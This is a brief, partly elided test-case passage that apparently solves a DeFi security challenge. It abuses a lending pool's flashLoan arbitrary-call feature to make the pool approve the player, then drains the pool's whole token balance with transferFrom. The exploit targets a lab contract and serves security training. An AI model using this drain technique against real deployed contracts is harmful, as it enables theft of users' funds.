  ...
  it('Execution', async function () {
    ...
    await pool
      ...
      .flashLoan(
        ...
        player.address,
        token.address,
        token.interface.encodeFunctionData('approve', [player.address, balance])
      );
    // send all the pool balance to the player
    await token
      .connect(player)
      .transferFrom(pool.address, player.address, balance);
  });
